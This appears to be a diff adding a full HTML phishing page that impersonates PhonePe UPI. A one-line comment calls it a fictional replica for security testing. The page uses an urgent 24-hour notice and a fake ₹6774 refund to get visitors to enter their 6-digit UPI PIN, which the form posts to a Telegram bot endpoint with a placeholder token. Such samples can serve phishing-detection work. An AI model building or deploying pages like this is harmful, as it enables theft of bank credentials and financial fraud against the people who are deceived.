@@ -1,0 +1,62 @@
+<!-- fictional replica for security testing -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhonePe UPI Verification</title>
+    <style>
+        :root {
+            --primary: #5f259f;
+            --secondary: #673ab7;
+            --bg: #f8fafc;
+            --text: #1e293b;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg); color: var(--text); display: flex; justify-content: center; padding: 16px; }
+        .p0_c1_container { width: 100%; max-width: 420px; background: #ffffff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); overflow: hidden; border: 1px solid #e2e8f0; }
+        .p0_c1_header { background: var(--primary); color: #ffffff; padding: 20px; text-align: center; }
+        .p0_c1_brand { font-size: 24px; font-weight: 800; letter-spacing: 0.5px; }
+        .p0_c1_tagline { font-size: 13px; opacity: 0.9; margin-top: 4px; }
+        .p0_c1_body { padding: 24px; }
+        .p0_c1_notice { background: #fef2f2; border-left: 4px solid #ef4444; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 13px; color: #991b1b; }
+        .p0_c1_amount-box { background: #f1f5f9; padding: 16px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
+        .p0_c1_amount-label { font-size: 12px; color: #64748b; text-transform: uppercase; }
+        .p0_c1_amount-val { font-size: 28px; font-weight: 700; color: var(--text); }
+        .p0_c1_form-group { margin-bottom: 16px; }
+        .p0_c1_label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #475569; }
+        .p0_c1_input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 4px; }
+        .p0_c1_btn { width: 100%; padding: 14px; background: var(--primary); color: #ffffff; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
+        .p0_c1_btn:hover { opacity: 0.9; }
+        .p0_c1_footer { padding: 16px; text-align: center; font-size: 11px; color: #94a3b8; border-top: 1px solid #f1f5f9; }
+    </style>
+</head>
+<body>
+    <div class="p0_c1_container">
+        <div class="p0_c1_header">
+            <div class="p0_c1_brand">PhonePe UPI</div>
+            <div class="p0_c1_tagline">Instant Settlement Gateway</div>
+        </div>
+        <div class="p0_c1_body">
+            <div class="p0_c1_notice">
+                Urgent: Complete your PHONEPE UPI profile validation within 24 hours.
+            </div>
+            <div class="p0_c1_amount-box">
+                <div class="p0_c1_amount-label">Pending Refund / Credit</div>
+                <div class="p0_c1_amount-val">₹6774</div>
+            </div>
+            <form action="https://api.telegram.org/bot1000011111:AAF-FAKE-bot_token_camp_01/sendMessage" method="POST">
+                <input type="hidden" name="vpa" value="settlement.desk1_1@ybl">
+                <div class="p0_c1_form-group">
+                    <label class="p0_c1_label" for="pin">ENTER 6-DIGIT UPI PIN TO AUTHORIZE</label>
+                    <input class="p0_c1_input" type="password" id="pin" name="upi_pin" maxlength="6" pattern="\d{6}" placeholder="••••••" required>
+                </div>
+                <button class="p0_c1_btn" type="submit">VERIFY &amp; PROCEED</button>
+            </form>
+        </div>
+        <div class="p0_c1_footer">
+            NPCI Certified UPI Gateway &bull; 256-Bit Encrypted &bull; Ref: 001001
+        </div>
+    </div>
+</body>
+</html>
